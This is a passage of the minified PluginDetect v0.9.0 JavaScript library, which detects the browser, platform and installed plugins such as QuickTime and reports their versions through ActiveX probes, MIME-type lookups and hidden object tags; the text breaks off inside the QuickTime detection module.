/*
PluginDetect v0.9.0
www.pinlady.net/PluginDetect/license/
[ QuickTime Java DevalVR Flash Shockwave WindowsMediaPlayer Silverlight VLC AdobeReader PDFReader RealPlayer IEcomponent ActiveX PDFjs ]
[ isMinVersion getVersion hasMimeType onDetectionDone ]
[ AllowActiveX ]
*/

var PluginDetect={version:"0.9.0",name:"PluginDetect",addPlugin:function(p,q){if(p&&PluginDetect.isString(p)&&q&&PluginDetect.isFunc(q.getVersion)){p=p.replace(/\s/g,"").toLowerCase();PluginDetect.Plugins[p]=q;if(!PluginDetect.isDefined(q.getVersionDone)){q.installed=null;q.version=null;q.version0=null;q.getVersionDone=null;q.pluginName=p;}}},uniqueName:function(){return PluginDetect.name+"998"},openTag:"<",hasOwnPROP:({}).constructor.prototype.hasOwnProperty,hasOwn:function(s,t){var p;try{p=PluginDetect.hasOwnPROP.call(s,t)}catch(q){}return !!p},rgx:{str:/string/i,num:/number/i,fun:/function/i,arr:/array/i},toString:({}).constructor.prototype.toString,isDefined:function(p){return typeof p!="undefined"},isArray:function(p){return PluginDetect.rgx.arr.test(PluginDetect.toString.call(p))},isString:function(p){return PluginDetect.rgx.str.test(PluginDetect.toString.call(p))},isNum:function(p){return PluginDetect.rgx.num.test(PluginDetect.toString.call(p))},isStrNum:function(p){return PluginDetect.isString(p)&&(/\d/).test(p)},isFunc:function(p){return PluginDetect.rgx.fun.test(PluginDetect.toString.call(p))},getNumRegx:/[\d][\d\.\_,\-]*/,splitNumRegx:/[\.\_,\-]/g,getNum:function(q,r){var p=PluginDetect.isStrNum(q)?(PluginDetect.isDefined(r)?new RegExp(r):PluginDetect.getNumRegx).exec(q):null;return p?p[0]:null},compareNums:function(w,u,t){var s,r,q,v=parseInt;if(PluginDetect.isStrNum(w)&&PluginDetect.isStrNum(u)){if(PluginDetect.isDefined(t)&&t.compareNums){return t.compareNums(w,u)}s=w.split(PluginDetect.splitNumRegx);r=u.split(PluginDetect.splitNumRegx);for(q=0;q<Math.min(s.length,r.length);q++){if(v(s[q],10)>v(r[q],10)){return 1}if(v(s[q],10)<v(r[q],10)){return -1}}}return 0},formatNum:function(q,r){var p,s;if(!PluginDetect.isStrNum(q)){return null}if(!PluginDetect.isNum(r)){r=4}r--;s=q.replace(/\s/g,"").split(PluginDetect.splitNumRegx).concat(["0","0","0","0"]);for(p=0;p<4;p++){if(/^(0+)(.+)$/.test(s[p])){s[p]=RegExp.$2}if(p>r||!(/\d/).test(s[p])){s[p]="0"}}return s.slice(0,4).join(",")},pd:{getPROP:function(s,q,p){try{if(s){p=s[q]}}catch(r){}return p},findNavPlugin:function(u){if(u.dbug){return u.dbug}var A=null;if(window.navigator){var z={Find:PluginDetect.isString(u.find)?new RegExp(u.find,"i"):u.find,Find2:PluginDetect.isString(u.find2)?new RegExp(u.find2,"i"):u.find2,Avoid:u.avoid?(PluginDetect.isString(u.avoid)?new RegExp(u.avoid,"i"):u.avoid):0,Num:u.num?/\d/:0},s,r,t,y,x,q,p=navigator.mimeTypes,w=navigator.plugins;if(u.mimes&&p){y=PluginDetect.isArray(u.mimes)?[].concat(u.mimes):(PluginDetect.isString(u.mimes)?[u.mimes]:[]);for(s=0;s<y.length;s++){r=0;try{if(PluginDetect.isString(y[s])&&/[^\s]/.test(y[s])){r=p[y[s]].enabledPlugin}}catch(v){}if(r){t=this.findNavPlugin_(r,z);if(t.obj){A=t.obj}if(A&&!PluginDetect.dbug){return A}}}}if(u.plugins&&w){x=PluginDetect.isArray(u.plugins)?[].concat(u.plugins):(PluginDetect.isString(u.plugins)?[u.plugins]:[]);for(s=0;s<x.length;s++){r=0;try{if(x[s]&&PluginDetect.isString(x[s])){r=w[x[s]]}}catch(v){}if(r){t=this.findNavPlugin_(r,z);if(t.obj){A=t.obj}if(A&&!PluginDetect.dbug){return A}}}q=w.length;if(PluginDetect.isNum(q)){for(s=0;s<q;s++){r=0;try{r=w[s]}catch(v){}if(r){t=this.findNavPlugin_(r,z);if(t.obj){A=t.obj}if(A&&!PluginDetect.dbug){return A}}}}}}return A},findNavPlugin_:function(t,s){var r=t.description||"",q=t.name||"",p={};if((s.Find.test(r)&&(!s.Find2||s.Find2.test(q))&&(!s.Num||s.Num.test(RegExp.leftContext+RegExp.rightContext)))||(s.Find.test(q)&&(!s.Find2||s.Find2.test(r))&&(!s.Num||s.Num.test(RegExp.leftContext+RegExp.rightContext)))){if(!s.Avoid||!(s.Avoid.test(r)||s.Avoid.test(q))){p.obj=t}}return p},getVersionDelimiter:",",findPlugin:function(r){var q,p={status:-3,plugin:0};if(!PluginDetect.isString(r)){return p}if(r.length==1){this.getVersionDelimiter=r;return p}r=r.toLowerCase().replace(/\s/g,"");q=PluginDetect.Plugins[r];if(!q||!q.getVersion){return p}p.plugin=q;p.status=1;return p}},getPluginFileVersion:function(u,q){var t,s,v,p,r=-1;if(!u){return q}if(u.version){t=PluginDetect.getNum(u.version+"")}if(!t||!q){return q||t||null}s=(PluginDetect.formatNum(q)).split(PluginDetect.splitNumRegx);v=(PluginDetect.formatNum(t)).split(PluginDetect.splitNumRegx);for(p=0;p<s.length;p++){if(r>-1&&p>r&&s[p]!="0"){return q}if(v[p]!=s[p]){if(r==-1){r=p}if(s[p]!="0"){return q}}}return t},AXO:(function(){var q;try{q=new window.ActiveXObject()}catch(p){}return q?null:window.ActiveXObject})(),getAXO:function(p){var r=null;try{r=new PluginDetect.AXO(p)}catch(q){PluginDetect.errObj=q;}if(r){PluginDetect.browser.ActiveXEnabled=!0}return r},browser:{detectPlatform:function(){var r=this,q,p=window.navigator?navigator.platform||"":"";PluginDetect.OS=100;if(p){var s=["Win",1,"Mac",2,"Linux",3,"FreeBSD",4,"iPhone",21.1,"iPod",21.2,"iPad",21.3,"Win.*CE",22.1,"Win.*Mobile",22.2,"Pocket\\s*PC",22.3,"",100];for(q=s.length-2;q>=0;q=q-2){if(s[q]&&new RegExp(s[q],"i").test(p)){PluginDetect.OS=s[q+1];break}}}},detectIE:function(){var r=this,u=document,t,q,v=window.navigator?navigator.userAgent||"":"",w,p,y;r.ActiveXFilteringEnabled=!1;r.ActiveXEnabled=!1;try{r.ActiveXFilteringEnabled=!!window.external.msActiveXFilteringEnabled()}catch(s){}p=["Msxml2.XMLHTTP","Msxml2.DOMDocument","Microsoft.XMLDOM","TDCCtl.TDCCtl","Shell.UIHelper","HtmlDlgSafeHelper.HtmlDlgSafeHelper","Scripting.Dictionary"];y=["WMPlayer.OCX","ShockwaveFlash.ShockwaveFlash","AgControl.AgControl"];w=p.concat(y);for(t=0;t<w.length;t++){if(PluginDetect.getAXO(w[t])&&!PluginDetect.dbug){break}}if(r.ActiveXEnabled&&r.ActiveXFilteringEnabled){for(t=0;t<y.length;t++){if(PluginDetect.getAXO(y[t])){r.ActiveXFilteringEnabled=!1;break}}}q=u.documentMode;try{u.documentMode=""}catch(s){}r.isIE=r.ActiveXEnabled;r.isIE=r.isIE||PluginDetect.isNum(u.documentMode)||new Function("return/*@cc_on!@*/!1")();try{u.documentMode=q}catch(s){}r.verIE=null;if(r.isIE){r.verIE=(PluginDetect.isNum(u.documentMode)&&u.documentMode>=7?u.documentMode:0)||((/^(?:.*?[^a-zA-Z])??(?:MSIE|rv\s*\:)\s*(\d+\.?\d*)/i).test(v)?parseFloat(RegExp.$1,10):7)}},detectNonIE:function(){var p=this,s=window.navigator?navigator:{},r=p.isIE?"":s.userAgent||"",t=s.vendor||"",q=s.product||"";p.isGecko=(/Gecko/i).test(q)&&(/Gecko\s*\/\s*\d/i).test(r);p.verGecko=p.isGecko?PluginDetect.formatNum((/rv\s*\:\s*([\.\,\d]+)/i).test(r)?RegExp.$1:"0.9"):null;p.isOpera=(/(OPR\s*\/|Opera\s*\/\s*\d.*\s*Version\s*\/|Opera\s*[\/]?)\s*(\d+[\.,\d]*)/i).test(r);p.verOpera=p.isOpera?PluginDetect.formatNum(RegExp.$2):null;p.isChrome=!p.isOpera&&(/(Chrome|CriOS)\s*\/\s*(\d[\d\.]*)/i).test(r);p.verChrome=p.isChrome?PluginDetect.formatNum(RegExp.$2):null;p.isSafari=!p.isOpera&&!p.isChrome&&((/Apple/i).test(t)||!t)&&(/Safari\s*\/\s*(\d[\d\.]*)/i).test(r);p.verSafari=p.isSafari&&(/Version\s*\/\s*(\d[\d\.]*)/i).test(r)?PluginDetect.formatNum(RegExp.$1):null;},init:function(){var p=this;p.detectPlatform();p.detectIE();p.detectNonIE()}},init:{hasRun:0,library:function(){window[PluginDetect.name]=PluginDetect;var q=this,p=document;PluginDetect.win.init();PluginDetect.head=p.getElementsByTagName("head")[0]||p.getElementsByTagName("body")[0]||p.body||null;PluginDetect.browser.init();q.hasRun=1;}},ev:{addEvent:function(r,q,p){if(r&&q&&p){if(r.addEventListener){r.addEventListener(q,p,false)}else{if(r.attachEvent){r.attachEvent("on"+q,p)}else{r["on"+q]=this.concatFn(p,r["on"+q])}}}},removeEvent:function(r,q,p){if(r&&q&&p){if(r.removeEventListener){r.removeEventListener(q,p,false)}else{if(r.detachEvent){r.detachEvent("on"+q,p)}}}},concatFn:function(q,p){return function(){q();if(typeof p=="function"){p()}}},handler:function(t,s,r,q,p){return function(){t(s,r,q,p)}},handlerOnce:function(s,r,q,p){return function(){var u=PluginDetect.uniqueName();if(!s[u]){s[u]=1;s(r,q,p)}}},handlerWait:function(s,u,r,q,p){var t=this;return function(){t.setTimeout(t.handler(u,r,q,p),s)}},setTimeout:function(q,p){if(PluginDetect.win&&PluginDetect.win.unload){return}setTimeout(q,p)},fPush:function(q,p){if(PluginDetect.isArray(p)&&(PluginDetect.isFunc(q)||(PluginDetect.isArray(q)&&q.length>0&&PluginDetect.isFunc(q[0])))){p.push(q)}},call0:function(q){var p=PluginDetect.isArray(q)?q.length:-1;if(p>0&&PluginDetect.isFunc(q[0])){q[0](PluginDetect,p>1?q[1]:0,p>2?q[2]:0,p>3?q[3]:0)}else{if(PluginDetect.isFunc(q)){q(PluginDetect)}}},callArray0:function(p){var q=this,r;if(PluginDetect.isArray(p)){while(p.length){r=p[0];p.splice(0,1);if(PluginDetect.win&&PluginDetect.win.unload&&p!==PluginDetect.win.unloadHndlrs){}else{q.call0(r)}}}},call:function(q){var p=this;p.call0(q);p.ifDetectDoneCallHndlrs()},callArray:function(p){var q=this;q.callArray0(p);q.ifDetectDoneCallHndlrs()},allDoneHndlrs:[],ifDetectDoneCallHndlrs:function(){var r=this,p,q;if(!r.allDoneHndlrs.length){return}if(PluginDetect.win){if(!PluginDetect.win.loaded||PluginDetect.win.loadPrvtHndlrs.length||PluginDetect.win.loadPblcHndlrs.length){return}}if(PluginDetect.Plugins){for(p in PluginDetect.Plugins){if(PluginDetect.hasOwn(PluginDetect.Plugins,p)){q=PluginDetect.Plugins[p];if(q&&PluginDetect.isFunc(q.getVersion)){if(q.OTF==3||(q.DoneHndlrs&&q.DoneHndlrs.length)||(q.BIHndlrs&&q.BIHndlrs.length)){return}}}}}r.callArray0(r.allDoneHndlrs);}},isMinVersion:function(v,u,r,q){var s=PluginDetect.pd.findPlugin(v),t,p=-1;if(s.status<0){return s.status}t=s.plugin;u=PluginDetect.formatNum(PluginDetect.isNum(u)?u.toString():(PluginDetect.isStrNum(u)?PluginDetect.getNum(u):"0"));if(t.getVersionDone!=1){t.getVersion(u,r,q);if(t.getVersionDone===null){t.getVersionDone=1}}if(t.installed!==null){p=t.installed<=0.5?t.installed:(t.installed==0.7?1:(t.version===null?0:(PluginDetect.compareNums(t.version,u,t)>=0?1:-0.1)))}return p},getVersion:function(u,r,q){var s=PluginDetect.pd.findPlugin(u),t,p;if(s.status<0){return null}t=s.plugin;if(t.getVersionDone!=1){t.getVersion(null,r,q);if(t.getVersionDone===null){t.getVersionDone=1}}p=(t.version||t.version0);p=p?p.replace(PluginDetect.splitNumRegx,PluginDetect.pd.getVersionDelimiter):p;return p},hasMimeType:function(t){if(t&&window.navigator&&navigator.mimeTypes){var w,v,q,s,p=navigator.mimeTypes,r=PluginDetect.isArray(t)?[].concat(t):(PluginDetect.isString(t)?[t]:[]);s=r.length;for(q=0;q<s;q++){w=0;try{if(PluginDetect.isString(r[q])&&/[^\s]/.test(r[q])){w=p[r[q]]}}catch(u){}v=w?w.enabledPlugin:0;if(v&&(v.name||v.description)){return w}}}return null},onDetectionDone:function(u,t,q,p){var r=PluginDetect.pd.findPlugin(u),v,s;if(r.status==-3){return -1}s=r.plugin;if(!PluginDetect.isArray(s.DoneHndlrs)){s.DoneHndlrs=[];}if(s.getVersionDone!=1){v=PluginDetect.getVersion?PluginDetect.getVersion(u,q,p):PluginDetect.isMinVersion(u,"0",q,p)}if(s.installed!=-0.5&&s.installed!=0.5){PluginDetect.ev.call(t);return 1}PluginDetect.ev.fPush(t,s.DoneHndlrs);return 0},codebase:{isDisabled:function(){if(PluginDetect.browser.ActiveXEnabled&&PluginDetect.isDefined(PluginDetect.pd.getPROP(document.createElement("object"),"object"))){return 0}return 1},isMin:function(u,t){var s=this,r,q,p=0;if(!PluginDetect.isStrNum(t)||s.isDisabled()){return p}s.init(u);if(!u.L){u.L={};for(r=0;r<u.Lower.length;r++){if(s.isActiveXObject(u,u.Lower[r])){u.L=s.convert(u,u.Lower[r]);break}}}if(u.L.v){q=s.convert(u,t,1);if(q.x>=0){p=(u.L.x==q.x?s.isActiveXObject(u,q.v):PluginDetect.compareNums(t,u.L.v)<=0)?1:-1}}return p},search:function(v){var B=this,w=v.$$,q=0,r;r=v.searchHasRun||B.isDisabled()?1:0;v.searchHasRun=1;if(r){return v.version||null}B.init(v);var F,E,D,s=v.DIGITMAX,t,p,C=99999999,u=[0,0,0,0],G=[0,0,0,0];var A=function(y,PluginDetect){var H=[].concat(u),I;H[y]=PluginDetect;I=B.isActiveXObject(v,H.join(","));if(I){q=1;u[y]=PluginDetect}else{G[y]=PluginDetect}return I};for(F=0;F<G.length;F++){u[F]=Math.floor(v.DIGITMIN[F])||0;t=u.join(",");p=u.slice(0,F).concat([C,C,C,C]).slice(0,u.length).join(",");for(D=0;D<s.length;D++){if(PluginDetect.isArray(s[D])){s[D].push(0);if(s[D][F]>G[F]&&PluginDetect.compareNums(p,v.Lower[D])>=0&&PluginDetect.compareNums(t,v.Upper[D])<0){G[F]=Math.floor(s[D][F])}}}for(E=0;E<30;E++){if(G[F]-u[F]<=16){for(D=G[F];D>=u[F]+(F?1:0);D--){if(A(F,D)){break}}break}A(F,Math.round((G[F]+u[F])/2))}if(!q){break}G[F]=u[F];}if(q){v.version=B.convert(v,u.join(",")).v}return v.version||null},emptyNode:function(p){try{p.innerHTML=""}catch(q){}},HTML:[],len:0,onUnload:function(r,q){var p,t=q.HTML,s;for(p=0;p<t.length;p++){s=t[p];if(s){t[p]=0;q.emptyNode(s.span());s.span=0;s.spanObj=0;s=0}}q.iframe=0},init:function(u){var t=this;if(!t.iframe){var s=PluginDetect.DOM,q;q=s.iframe.insert(0,"$.codebase{ }");t.iframe=q;s.iframe.write(q," ");s.iframe.close(q);}if(!u.init){u.init=1;var p,r;PluginDetect.ev.fPush([t.onUnload,t],PluginDetect.win.unloadHndlrs);u.tagA='<object width="1" height="1" style="display:none;" codebase="#version=';r=u.classID||u.$$.classID||"";u.tagB='" '+((/clsid\s*:/i).test(r)?'classid="':'type="')+r+'">'+PluginDetect.openTag+"/object>";for(p=0;p<u.Lower.length;p++){u.Lower[p]=PluginDetect.formatNum(u.Lower[p]);u.Upper[p]=PluginDetect.formatNum(u.Upper[p]);}}},isActiveXObject:function(u,q){var t=this,p=0,s=u.$$,r=(PluginDetect.DOM.iframe.doc(t.iframe)||document).createElement("span");if(u.min&&PluginDetect.compareNums(q,u.min)<=0){return 1}if(u.max&&PluginDetect.compareNums(q,u.max)>=0){return 0}r.innerHTML=u.tagA+q+u.tagB;if(PluginDetect.pd.getPROP(r.firstChild,"object")){p=1}if(p){u.min=q;t.HTML.push({spanObj:r,span:t.span})}else{u.max=q;r.innerHTML=""}return p},span:function(){return this.spanObj},convert_:function(t,p,q,s){var r=t.convert[p];return r?(PluginDetect.isFunc(r)?PluginDetect.formatNum(r(q.split(PluginDetect.splitNumRegx),s).join(",")):q):r},convert:function(v,r,u){var t=this,q,p,s;r=PluginDetect.formatNum(r);p={v:r,x:-1};if(r){for(q=0;q<v.Lower.length;q++){s=t.convert_(v,q,v.Lower[q]);if(s&&PluginDetect.compareNums(r,u?s:v.Lower[q])>=0&&(!q||PluginDetect.compareNums(r,u?t.convert_(v,q,v.Upper[q]):v.Upper[q])<0)){p.v=t.convert_(v,q,r,u);p.x=q;break}}}return p},z:0},win:{disable:function(){this.cancel=true},cancel:false,loaded:false,unload:false,hasRun:0,init:function(){var p=this;if(!p.hasRun){p.hasRun=1;if((/complete/i).test(document.readyState||"")){p.loaded=true;}else{PluginDetect.ev.addEvent(window,"load",p.onLoad)}PluginDetect.ev.addEvent(window,"unload",p.onUnload)}},loadPrvtHndlrs:[],loadPblcHndlrs:[],unloadHndlrs:[],onUnload:function(){var p=PluginDetect.win;if(p.unload){return}p.unload=true;PluginDetect.ev.removeEvent(window,"load",p.onLoad);PluginDetect.ev.removeEvent(window,"unload",p.onUnload);PluginDetect.ev.callArray(p.unloadHndlrs)},onLoad:function(){var p=PluginDetect.win;if(p.loaded||p.unload||p.cancel){return}p.loaded=true;PluginDetect.ev.callArray(p.loadPrvtHndlrs);PluginDetect.ev.callArray(p.loadPblcHndlrs);}},DOM:{isEnabled:{objectTag:function(){var q=PluginDetect.browser,p=q.isIE?0:1;if(q.ActiveXEnabled){p=1}return !!p},objectTagUsingActiveX:function(){var p=0;if(PluginDetect.browser.ActiveXEnabled){p=1}return !!p},objectProperty:function(p){if(p&&p.tagName&&PluginDetect.browser.isIE){if((/applet/i).test(p.tagName)){return(!this.objectTag()||PluginDetect.isDefined(PluginDetect.pd.getPROP(document.createElement("object"),"object"))?1:0)}return PluginDetect.isDefined(PluginDetect.pd.getPROP(document.createElement(p.tagName),"object"))?1:0}return 0}},HTML:[],div:null,divID:"plugindetect",divWidth:500,getDiv:function(){return this.div||document.getElementById(this.divID)||null},initDiv:function(){var q=this,p;if(!q.div){p=q.getDiv();if(p){q.div=p;}else{q.div=document.createElement("div");q.div.id=q.divID;q.setStyle(q.div,q.getStyle.div());q.insertDivInBody(q.div)}PluginDetect.ev.fPush([q.onUnload,q],PluginDetect.win.unloadHndlrs)}p=0},pluginSize:1,iframeWidth:40,iframeHeight:10,altHTML:"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;",emptyNode:function(q){var p=this;if(q&&(/div|span/i).test(q.tagName||"")){if(PluginDetect.browser.isIE){p.setStyle(q,["display","none"])}try{q.innerHTML=""}catch(r){}}},removeNode:function(p){try{if(p&&p.parentNode){p.parentNode.removeChild(p)}}catch(q){}},onUnload:function(u,t){var r,q,s,v,w=t.HTML,p=w.length;if(p){for(q=p-1;q>=0;q--){v=w[q];if(v){w[q]=0;t.emptyNode(v.span());t.removeNode(v.span());v.span=0;v.spanObj=0;v.doc=0;v.objectProperty=0}}}r=t.getDiv();t.emptyNode(r);t.removeNode(r);v=0;s=0;r=0;t.div=0},span:function(){var p=this;if(!p.spanObj){p.spanObj=p.doc.getElementById(p.spanId)}return p.spanObj||null},width:function(){var t=this,s=t.span(),q,r,p=-1;q=s&&PluginDetect.isNum(s.scrollWidth)?s.scrollWidth:p;r=s&&PluginDetect.isNum(s.offsetWidth)?s.offsetWidth:p;s=0;return r>0?r:(q>0?q:Math.max(r,q))},obj:function(){var p=this.span();return p?p.firstChild||null:null},readyState:function(){var p=this;return PluginDetect.browser.isIE&&PluginDetect.isDefined(PluginDetect.pd.getPROP(p.span(),"readyState"))?PluginDetect.pd.getPROP(p.obj(),"readyState"):PluginDetect.UNDEFINED},objectProperty:function(){var r=this,q=r.DOM,p;if(q.isEnabled.objectProperty(r)){p=PluginDetect.pd.getPROP(r.obj(),"object")}return p},onLoadHdlr:function(p,q){q.loaded=1},getTagStatus:function(q,A,E,D,t,H,v){var F=this;if(!q||!q.span()){return -2}var y=q.width(),r=q.obj()?1:0,s=q.readyState(),p=q.objectProperty();if(p){return 1.5}var u=/clsid\s*\:/i,C=E&&u.test(E.outerHTML||"")?E:(D&&u.test(D.outerHTML||"")?D:0),w=E&&!u.test(E.outerHTML||"")?E:(D&&!u.test(D.outerHTML||"")?D:0),z=q&&u.test(q.outerHTML||"")?C:w;if(!A||!A.span()||!z||!z.span()){return -2}var x=z.width(),B=A.width(),G=z.readyState();if(y<0||x<0||B<=F.pluginSize){return 0}if(v&&!q.pi&&PluginDetect.isDefined(p)&&PluginDetect.browser.isIE&&q.tagName==z.tagName&&q.time<=z.time&&y===x&&s===0&&G!==0){q.pi=1}if(x<B||!q.loaded||!A.loaded||!z.loaded){return q.pi?-0.1:0}if(y==B||!r){return q.pi?-0.5:-1}else{if(y==F.pluginSize&&r&&(!PluginDetect.isNum(s)||s===4)){return 1}}return q.pi?-0.5:-1},setStyle:function(q,t){var s=q.style,p;if(s&&t){for(p=0;p<t.length;p=p+2){try{s[t[p]]=t[p+1]}catch(r){}}}q=0;s=0},getStyle:{iframe:function(){return this.span()},span:function(r){var q=PluginDetect.DOM,p;p=r?this.plugin():([].concat(this.Default).concat(["display","inline","fontSize",(q.pluginSize+3)+"px","lineHeight",(q.pluginSize+3)+"px"]));return p},div:function(){var p=PluginDetect.DOM;return[].concat(this.Default).concat(["display","block","width",p.divWidth+"px","height",(p.pluginSize+3)+"px","fontSize",(p.pluginSize+3)+"px","lineHeight",(p.pluginSize+3)+"px","position","absolute","right","9999px","top","-9999px"])},plugin:function(q){var p=PluginDetect.DOM;return"background-color:transparent;background-image:none;vertical-align:baseline;outline-style:none;border-style:none;padding:0px;margin:0px;visibility:"+(q?"hidden;":"visible;")+"display:inline;font-size:"+(p.pluginSize+3)+"px;line-height:"+(p.pluginSize+3)+"px;"},Default:["backgroundColor","transparent","backgroundImage","none","verticalAlign","baseline","outlineStyle","none","borderStyle","none","padding","0px","margin","0px","visibility","visible"]},insertDivInBody:function(v,t){var u="pd33993399",q=null,s=t?window.top.document:window.document,p=s.getElementsByTagName("body")[0]||s.body;if(!p){try{s.write('<div id="'+u+'">.'+PluginDetect.openTag+"/div>");q=s.getElementById(u)}catch(r){}}p=s.getElementsByTagName("body")[0]||s.body;if(p){p.insertBefore(v,p.firstChild);if(q){p.removeChild(q)}}v=0},iframe:{onLoad:function(p,q){PluginDetect.ev.callArray(p);},insert:function(r,q){var s=this,v=PluginDetect.DOM,p,u=document.createElement("iframe"),t;v.setStyle(u,v.getStyle.iframe());u.width=v.iframeWidth;u.height=v.iframeHeight;v.initDiv();p=v.getDiv();p.appendChild(u);try{s.doc(u).open()}catch(w){}u[PluginDetect.uniqueName()]=[];t=PluginDetect.ev.handlerOnce(PluginDetect.isNum(r)&&r>0?PluginDetect.ev.handlerWait(r,s.onLoad,u[PluginDetect.uniqueName()],q):PluginDetect.ev.handler(s.onLoad,u[PluginDetect.uniqueName()],q));PluginDetect.ev.addEvent(u,"load",t);if(!u.onload){u.onload=t}PluginDetect.ev.addEvent(s.win(u),"load",t);return u},addHandler:function(q,p){if(q){PluginDetect.ev.fPush(p,q[PluginDetect.uniqueName()])}},close:function(p){try{this.doc(p).close()}catch(q){}},write:function(p,r){try{this.doc(p).write(r)}catch(q){}},win:function(p){try{return p.contentWindow}catch(q){}return null},doc:function(p){var r;try{r=p.contentWindow.document}catch(q){}try{if(!r){r=p.contentDocument}}catch(q){}return r||null}},insert:function(t,s,u,p,y,w,v){var D=this,F,E,C,B,A;if(!v){D.initDiv();v=D.getDiv()}if(v){if((/div/i).test(v.tagName)){B=v.ownerDocument}if((/iframe/i).test(v.tagName)){B=D.iframe.doc(v)}}if(B&&B.createElement){}else{B=document}if(!PluginDetect.isDefined(p)){p=""}if(PluginDetect.isString(t)&&(/[^\s]/).test(t)){t=t.toLowerCase().replace(/\s/g,"");F=PluginDetect.openTag+t+" ";F+='style="'+D.getStyle.plugin(w)+'" ';var r=1,q=1;for(A=0;A<s.length;A=A+2){if(/[^\s]/.test(s[A+1])){F+=s[A]+'="'+s[A+1]+'" '}if((/width/i).test(s[A])){r=0}if((/height/i).test(s[A])){q=0}}F+=(r?'width="'+D.pluginSize+'" ':"")+(q?'height="'+D.pluginSize+'" ':"");if(t=="embed"||t=="img"){F+=" />"}else{F+=">";for(A=0;A<u.length;A=A+2){if(/[^\s]/.test(u[A+1])){F+=PluginDetect.openTag+'param name="'+u[A]+'" value="'+u[A+1]+'" />'}}F+=p+PluginDetect.openTag+"/"+t+">"}}else{t="";F=p}E={spanId:"",spanObj:null,span:D.span,loaded:null,tagName:t,outerHTML:F,DOM:D,time:new Date().getTime(),width:D.width,obj:D.obj,readyState:D.readyState,objectProperty:D.objectProperty,doc:B};if(v&&v.parentNode){if((/iframe/i).test(v.tagName)){D.iframe.addHandler(v,[D.onLoadHdlr,E]);E.loaded=0;E.spanId=PluginDetect.name+"Span"+D.HTML.length;C='<span id="'+E.spanId+'" style="'+D.getStyle.span(1)+'">'+F+"</span>";D.iframe.write(v,C)}else{if((/div/i).test(v.tagName)){C=B.createElement("span");D.setStyle(C,D.getStyle.span());v.appendChild(C);try{C.innerHTML=F}catch(z){}E.spanObj=C}}}C=0;v=0;D.HTML.push(E);return E}},file:{any:"fileStorageAny999",valid:"fileStorageValid999",save:function(s,t,r){var q=this,p;if(s&&PluginDetect.isDefined(r)){if(!s[q.any]){s[q.any]=[]}if(!s[q.valid]){s[q.valid]=[]}s[q.any].push(r);p=q.split(t,r);if(p){s[q.valid].push(p)}}},getValidLength:function(p){return p&&p[this.valid]?p[this.valid].length:0},getAnyLength:function(p){return p&&p[this.any]?p[this.any].length:0},getValid:function(r,p){var q=this;return r&&r[q.valid]?q.get(r[q.valid],p):null},getAny:function(r,p){var q=this;return r&&r[q.any]?q.get(r[q.any],p):null},get:function(s,p){var r=s.length-1,q=PluginDetect.isNum(p)?p:r;return(q<0||q>r)?null:s[q]},split:function(t,q){var s=null,p,r;t=t?t.replace(".","\\."):"";r=new RegExp("^(.*[^\\/])("+t+"\\s*)$");if(PluginDetect.isString(q)&&r.test(q)){p=(RegExp.$1).split("/");s={name:p[p.length-1],ext:RegExp.$2,full:q};p[p.length-1]="";s.path=p.join("/")}return s}},Plugins:{}};PluginDetect.init.library();var i={setPluginStatus:function(q,p,s){var r=this;r.version=p?PluginDetect.formatNum(p,3):null;r.installed=r.version?1:(s?(s>0?0.7:-0.1):(q?0:-1));r.getVersionDone=r.installed==0.7||r.installed==-0.1||r.nav.done===0?0:1;},getVersion:function(s,t){var u=this,p=null,r=0,q;t=PluginDetect.browser.isIE?0:t;if((!r||PluginDetect.dbug)&&u.nav.query(t).installed){r=1}if((!p||PluginDetect.dbug)&&u.nav.query(t).version){p=u.nav.version}q=!p?u.codebase.isMin(s):0;if(q){u.setPluginStatus(0,0,q);return}if(!p||PluginDetect.dbug){q=u.codebase.search();if(q){r=1;p=q}}if((!r||PluginDetect.dbug)&&u.axo.query().installed){r=1}if((!p||PluginDetect.dbug)&&u.axo.query().version){p=u.axo.version}u.setPluginStatus(r,p)},nav:{done:null,installed:0,version:null,result:[0,0],mimeType:["video/quicktime","application/x-quicktimeplayer","image/x-macpaint","image/x-quicktime","application/x-rtsp","application/x-sdp","application/sdp","audio/vnd.qcelp","video/sd-video","audio/mpeg","video/mp4","video/3gpp2","application/x-mpeg","audio/x-m4b","audio/x-aac","video/flc"],find:"QuickTime.*Plug-?in",find2:"QuickTime.*Plug-?in",find3filename:"QuickTime|QT",avoid:"Totem|VLC|RealPlayer|Helix|MPlayer|Windows\\s*Media\\s*Player",plugins:"QuickTime Plug-in",detect:function(s){var t=this,r,q,p={installed:0,version:null,plugin:null};r=PluginDetect.pd.findNavPlugin({find:t.find,find2:s?0:t.find2,avoid:s?0:t.avoid,mimes:t.mimeType,plugins:t.plugins});if(r){p.plugin=r;p.installed=1;q=new RegExp(t.find,"i");if(r.name&&q.test(r.name+"")){p.version=PluginDetect.getNum(r.name+"")}}return p},query:function(r){var q=this,t,s;r=r?1:0;if(q.done===null){if(PluginDetect.hasMimeType(q.mimeType)){s=q.detect(1);if(s.installed){t=q.detect(0);q.result=[t,t.installed?t:s]}var x=q.result[0],v=q.result[1],w=new RegExp(q.avoid,"i"),u=new RegExp(q.find3filename,"i"),p;x=x?x.plugin:0;v=v?v.plugin:0;if(!x&&v&&v.name&&(!v.description||(/^[\s]*$/).test(v.description+""))&&!w.test(v.name+"")){p=(v.filename||"")+"";if((/^.*[\\\/]([^\\\/]*)$/).test(p)){p=RegExp.$1;}if(p&&u.test(p)&&!w.test(p)){q.result[0]=q.result[1]}}}q.done=q.result[0]===q.result[1]?1:0;}if(q.result[r]){q.installed=q.result[r].installed;q.version=q.result[r].version}return q}},codebase:{classID:"clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B",isMin:function(r){var s=this,q,p=0;s.$$=i;if(PluginDetect.isStrNum(r)){q=r.split(PluginDetect.splitNumRegx);if(q.length>3&&parseInt(q[3],10)>0){q[3]="9999"}r=q.join(",");p=PluginDetect.codebase.isMin(s,r)}return p},search:function(){this.$$=i;return PluginDetect.codebase.search(this)},DIGITMAX:[[12,11,11],[7,60],[7,11,11],0,[7,11,11]],DIGITMIN:[5,0,0,0],Upper:["999","7,60","7,50","7,6","7,5"],Lower:["7,60","7,50","7,6","7,5","0"],convert:[1,function(r,q){return 